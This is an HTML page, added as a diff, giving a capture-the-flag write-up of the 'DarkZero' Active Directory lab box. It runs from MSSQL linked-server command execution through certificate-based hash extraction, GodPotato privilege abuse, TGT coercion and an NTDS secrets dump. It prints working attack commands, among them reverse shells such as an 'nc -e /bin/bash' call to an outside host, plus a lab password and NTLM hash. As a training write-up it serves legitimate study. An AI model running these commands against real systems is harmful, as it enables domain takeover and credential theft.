@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Darkzero Write-Up</title>
+        <link rel="stylesheet" href="style.css">
+        <script defer src="script.js"></script>
+        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    </head>
+    <body>
+        <div class="container">
+            <nav class="navbar">
+                <ul class="nav-links">
+                    <li><a href="index.html"><i class="fas fa-home"></i> Home</a></li>
+                    <li><a href="Write-up.html"><i class="fas fa-file-alt"></i> Write-Ups</a></li>
+                    <li><a href="redteam.html"><i class="fas fa-user-secret"></i> Red Team</a></li>
+                </ul>
+            </nav>
+            <div class="contents">
+                <h1>Darkzero Write-Up</h1>
+                <img src="images/darkzero.png" alt="Darkzero Write-Up">
+                <p>DarkZero is a Windows Active Directory box that is designed to test your skills and knowledge of Active Directory services. First it starts off with logging into the MSSQL server and using the linked server that has cmdshell access to the server. We get a reverse shell and found a GPO backup file. Within the contents of the GPO backup file shows our current user has <code>SeImpersonatePrivilege</code> but we have a restricted token. We enroll our user into the User Template and perform <code>UnPAC-the-hash</code> to get the users hash. We run RunasCs to get a shell as the user without a restricted token. We are able to abuse the Privilege to reset the administrator password and log in as administrator. We know we are in a forest network and so to compromise the DC01 we need to corhorce the DC01$ computer account to DC02 which we will get the TGT for DC01$ which allows us to dump the ntds.dit file and perfomring pass the hash to log into the DC01 as administrator thus fully compromising the domain.</p>
+                <h2>Enumeration</h2>
+                <h3>Nmap Scan</h3>
+                <div class="snippet">
+                    <pre class="code-block">
+# Nmap 7.95 scan initiated Sun Oct  5 22:04:06 2025 as: /usr/lib/nmap/nmap --privileged -sV -sC -p- -oN DarkZero.scan 10.10.11.89
+Nmap scan report for 10.10.11.89
+Host is up (0.070s latency).
+Not shown: 65512 filtered tcp ports (no-response)
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
+| ms-sql-ntlm-info: 
+|   10.10.11.89:1433: 
+|     Target_Name: darkzero
+|     NetBIOS_Domain_Name: darkzero
+|     NetBIOS_Computer_Name: DC01
+|     DNS_Domain_Name: darkzero.htb
+|     DNS_Computer_Name: DC01.darkzero.htb
+|     DNS_Tree_Name: darkzero.htb
+|_    Product_Version: 10.0.26100
+|_ssl-date: 2025-10-06T09:10:11+00:00; +7h00m00s from scanner time.
+| ms-sql-info: 
+|   10.10.11.89:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2022 RTM
+|       number: 16.00.1000.00
+|       Product: Microsoft SQL Server 2022
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2025-10-06T06:38:05
+|_Not valid after:  2055-10-06T06:38:05
+2179/tcp  open  vmrdp?
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+|_ssl-date: TLS randomness does not represent time
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: darkzero.htb0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.darkzero.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.darkzero.htb
+| Not valid before: 2025-07-29T11:40:00
+|_Not valid after:  2026-07-29T11:40:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49682/tcp open  msrpc         Microsoft Windows RPC
+49683/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49905/tcp open  msrpc         Microsoft Windows RPC
+49931/tcp open  msrpc         Microsoft Windows RPC
+49967/tcp open  msrpc         Microsoft Windows RPC
+50550/tcp open  msrpc         Microsoft Windows RPC
+50673/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
+| smb2-time: 
+|   date: 2025-10-06T09:09:32
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct  5 22:10:11 2025 -- 1 IP address (1 host up) scanned in 364.18 seconds
+                    </pre>
+                </div>
+                <p>We can see there is mssql which our user has access to. We can authenticate via windows authentication.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+impacket-mssqlclient john.w:'RFulUtONCOL!'@10.10.11.89 -windows-auth
+                    </pre>
+                </div>
+                <p>We can check for linked servers which shows us a server called <code>DC02.darkzero.ext</code></p>
+                <div class="snippet">
+                    <pre class="code-block">
+SQL (darkzero\john.w  guest@master)> enum_links
+SRV_NAME            SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE      SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
+-----------------   ----------------   -----------   -----------------   ------------------   ------------   -------   
+DC01                SQLNCLI            SQL Server    DC01                NULL                 NULL           NULL      
+
+DC02.darkzero.ext   SQLNCLI            SQL Server    DC02.darkzero.ext   NULL                 NULL           NULL      
+
+Linked Server       Local Login       Is Self Mapping   Remote Login   
+-----------------   ---------------   ---------------   ------------   
+DC02.darkzero.ext   darkzero\john.w                 0   dc01_sql_svc 
+                    </pre>
+                </div>
+                <p>We can see there is <code>DC01</code> and <code>DC02.darkzero.ext</code> servers. This also indicates that we are in a forest network. Connecting to the <code>DC02.darkzero.ext</code> server we can enable cmdshell access to the server.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+SQL (darkzero\john.w  guest@master)> use_link [DC02.darkzero.ext]
+SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> enable_xp_cmdshell
+INFO(DC02): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+INFO(DC02): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL >[DC02.darkzero.ext] (dc01_sql_svc  dbo@master)> xp_cmdshell whoami
+                    </pre>
+                </div>
+                <p>This shows us we are running as <code>svc_sql</code> user. Let's get a reverse shell. One method I prefer is to execute a reverse base64 powershell script in memory from revshells <a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
+                <img src="images/reverse_svc_sql.png" alt="Reverse SVC SQL">
+                <p>Now in the <code>C:\</code> there is a file called <code>Policy_Backup.inf</code> which is a group policy object backup file. One particular line stands out which is the <code>SeImpersonatePrivilege</code> because it shows the SID for the group <code>NT SERVICE\SERVICE</code> and <code>NT SERVICE\MSSQLSERVER</code> which the <code>MSSQLSERVER</code> is apart of the <code>SERVICE</code> group. It runs under it. We can see the SID matches to the SID in <code>SeImpersonatePrivilege</code> The reason We dont have the privilege enabled or shows up is because our token is restricted from executing commands with <code>xp_cmdshell</code> which is common in order to not abuse the dangerous GPOs. To bypass this we will need to get a shell via a password or hash of the user <code>svc_sql</code></p>
+                <img src="images/GPO-sid-darkzero.png" alt="Policy Backup">
+                <div class="small-to-big-image">
+                    <img src="images/GPO-svc_sql-darkzero.png" alt="GPO SVC SQL">
+                </div>
+                <p>I will use a tool called Sharphound to enumerate the domain which shows us that the user <code>svc_sql</code> can enroll into the User Template.</p>
+                <img src="images/bloodhound-darkzero.png" alt="Bloodhound">
+                <p>The pathway I see in this is taking advantage enrolling into the <code>User</code> template which will give us a pem file then convert it into a pfx file and extract the hash from the pfx file allowing us to change the password for the <code>svc_sql</code> with the hash. After we can run RunasCs to catch a reverse shell and we should have the full permissions of <code>svc_sql</code> which contains <code>SeImpersonatePrivilege</code></p>
+                <p>We need to find the <code>CA</code> name. We will use the tool called <code>Certify</code></p>
+                <div class="snippet">
+                    <pre class="code-block">
+.\Certify find /currentuser
+                    </pre>
+                </div>
+                <img src="images/cartify-darkzero.png" alt="Certify">
+                <p>Now we can start to request to enroll into the <code>User</code> template.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+.\Certify.exe request /ca:DC02.darkzero.ext\darkzero-ext-DC02-CA /template:User
+                    </pre>
+                </div>
+                <div class="big-to-normal-image">
+                    <img src="images/pem-keys-darkzero.png" alt="PEM Keys">
+                </div>
+                <img src="images/pem-to-pfx-darkzero.png" alt="PEM to PFX">
+                <p>Copy the RSA and Certificate keys into the same file in this case named <code>cert.pem</code> then we convert the pem file into a pfx file. Make sure to press enter to skip the password.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+                    </pre>
+                </div>
+                <p>Once converted we will transfer the pfx file onto the victim machine. We then can run <code>Rubeus</code> to request a TGT and extract the ntlm hash.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+.\Rubeus.exe asktgt /user:svc_sql /domain:darkzero-ext /dc:DC02.darkzero.ext /getcredentials /certificate:C:\Users\svc_sql\cert.pfx
+                    </pre>
+                </div>
+                <img src="images/ntlm-hash-darkzero.png" alt="NTLM Hash">
+                <h3>We got the ntlm hash but how does this actually work?</h3>
+                <p>Instead of using traditional password-based Kerberos or NTLM authentication, we leverage <code>PKINIT</code> certificate-based initial authentication.We send an <code>AS-REQ</code> (Authentication Service Request) with <code>PKINIT</code> pre-authentication data, signed using the private key from our enrolled PFX file.</p>
+                <p>The Domain Controller (KDC) validates the certificate by:</p>
+                <ul>
+                    <li>Checking the subject (CN or UPN) matches the target user account (svc_sql).</li>
+                    <li>Verifying the certificate chain back to a trusted Enterprise CA.</li>
+                    <li>Confirming the certificate includes the Client Authentication Extended Key Usage (EKU).</li>
+                </ul>
+                <p>If everything checks out, the KDC treats this as valid strong authentication and issues us a TGT (Ticket-Granting Ticket) without ever needing the account's password. Now, with the TGT in hand, we send a special <code>TGS-REQ</code> (Ticket-Granting Service Request) in <code>User-to-User (U2U)</code> mode triggered in Rubeus via the <code>/getcredentials</code> flag. In U2U, the client includes the TGT and asks the KDC for additional encrypted credential information about the user. For backward compatibility with legacy systems, Microsoft's KDC includes the user's current NTLM hash (RC4-HMAC key) in this response.</p>
+                <p>This credential blob is encrypted using the session key established during the original TGT exchange. Since we successfully completed PKINIT, we possess that session key so Rubeus can decrypt the blob and extract the real NTLM hash.</p>
+                <p>(This technique is commonly known as UnPAC-the-hash via PKINIT.)</p>
+                <div class="snippet">
+                    <pre class="code-block">
+You (attacker)
+   │
+   ├── Enroll in "User" template → get PFX (cert + private key)
+   │
+   ├── AS-REQ + PKINIT (signed with private key)
+   │     ↓
+   DC (KDC)
+         Validates cert → issues TGT + session key
+   │     ↑
+   └── Receive TGT
+   │
+   ├── TGS-REQ (U2U mode) + include TGT → request credentials
+   │     ↓
+   DC
+         Returns encrypted blob containing NTLM hash
+   │     ↑
+   └── Decrypt blob with session key → NTLM hash extracted!
+                    </pre>
+                </div>
+                <p>Since we got the ntlm hash we need to set up ligolo-ng to be able to reach the dc host from our machine. I will not show how to set up ligolo-ng in this write up. Once we have ligolo-ng set up we can use one of impacket's scripts called <code>changepasswd.py</code> which will change the password of <code>svc_sql</code></p>
+                <div class="snippet">
+                    <pre class="code-block">
+changepasswd.py svc_sql@172.16.20.2 -hashes :816CCB849956B531DB139346751DB65F
+                    </pre>
+                </div>
+                <img src="images/changepass-svc-darkzero.png" alt="Change Password SVC SQL">
+                <p>Now we need to use RunasCs.exe to catch a reverse shell.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+.\RunasCs.exe "svc_sql" "Pixel123" powershell.exe -r 10.10.14.95:2222 -l 5 -b "nc -e /bin/bash 10.8.5.55 4444"
+                    </pre>
+                </div>
+                <p>As you can see we do have the privilege enabled for svc_sql</p>
+                <img src="images/seimpersonate-enabled-darkzero.png" alt="SeImpersonate Enabled">
+                <p>Now we can use godpotato to exploit the privilege and reset the administrator password. I have tried to get a reverse shell in powershell but it all failed to establish a connection.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+.\Godpotato.exe -cmd "cmd /c net user administrator Pixel123@"
+                    </pre>
+                </div>
+                <div class="snippet">
+                    <pre class="code-block">
+.\RunasCs.exe "Administrator" "Pixel123@" powershell -r 10.10.14.95:3434
+                    </pre>
+                </div>
+                <img src="images/administrator-dc02-darkzero.png" alt="Administrator DC02">
+                <p>With the user as administrator and powershell shell we can find if unconstrained delegation is enabled.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+Get-ADComputer -Filter 'TrustedForDelegation -eq $true' -Properties TrustedForDelegation | Select-Object Name, DistinguishedName, TrustedForDelegation
+                    </pre>
+                </div>
+                <div class="small-to-big-image">
+                    <img src="images/unconstrained-dc-darkzero.png" alt="Unconstrained DC">
+                </div>
+                <p>The DC02 has delegation enabled, the dc by default comes with this enabled. Now how can we abuse this? typically this would be useless since we already basically compromised the DC but we are in a forest and we need to compromise the DC01 not DC02. In this case we can coerce the DC01 to DC02 via mssql which we will capture the TGT for DC01$ account which we can dump the ntds.dit.</p>
+                <p>On the administrator we need to run rubeus.exe</p>
+                <div class="snippet">
+                    <pre class="code-block">
+.\Rubeus.exe monitor /nowrap /interval:5
+                    </pre>
+                </div>
+                <p>Then on another terminal log into mssql and run this command.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+xp_dirtree \\DC02.darkzero.ext\doesnotexit
+                    </pre>
+                </div>
+                <img src="images/coerce-darkzeo.png" alt="Coerce Darkzero">
+                <img src="images/TGT-DC01-darkzero.png" alt="TGT DC01">
+                <p>Copy the TGT into a file which I will name the file file It is in base64 so we need to decode it and put it into a new file.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+cat file | base64 -d > ticket.kirbi
+                    </pre>
+                </div>
+                <p>Then we need to convert it from kirbi to ccache for linux use.</p>
+                <div class="snippet">
+                    <pre class="code-block">
+ticketConverter.py ticket.kirbi dc01.ccache
+                    </pre>
+                </div>
+                <p>Now we need to import the dc01.ccache</p>
+                <div class="snippet">
+                    <pre class="code-block">
+export KRB5CCNAME=/home/pixelrazer/htb/dc01.ccache
+                    </pre>
+                </div>
+                <div class="snippet">
+                    <pre class="code-block">
+secretsdump.py -k -no-pass 'darkzero.htb/DC01$@DC01.darkzero.htb' -just-dc-user administrator
+                    </pre>
+                </div>
+                <img src="images/secrets-dump-darkzero.png" alt="Secrets Dump">
+                <p>Now we can winrm as administrator to DC01</p>
+                <img src="images/administrator-dc01-darkzero.png" alt="Administrator DC01">
+            </div>
+    </body>
+</html>
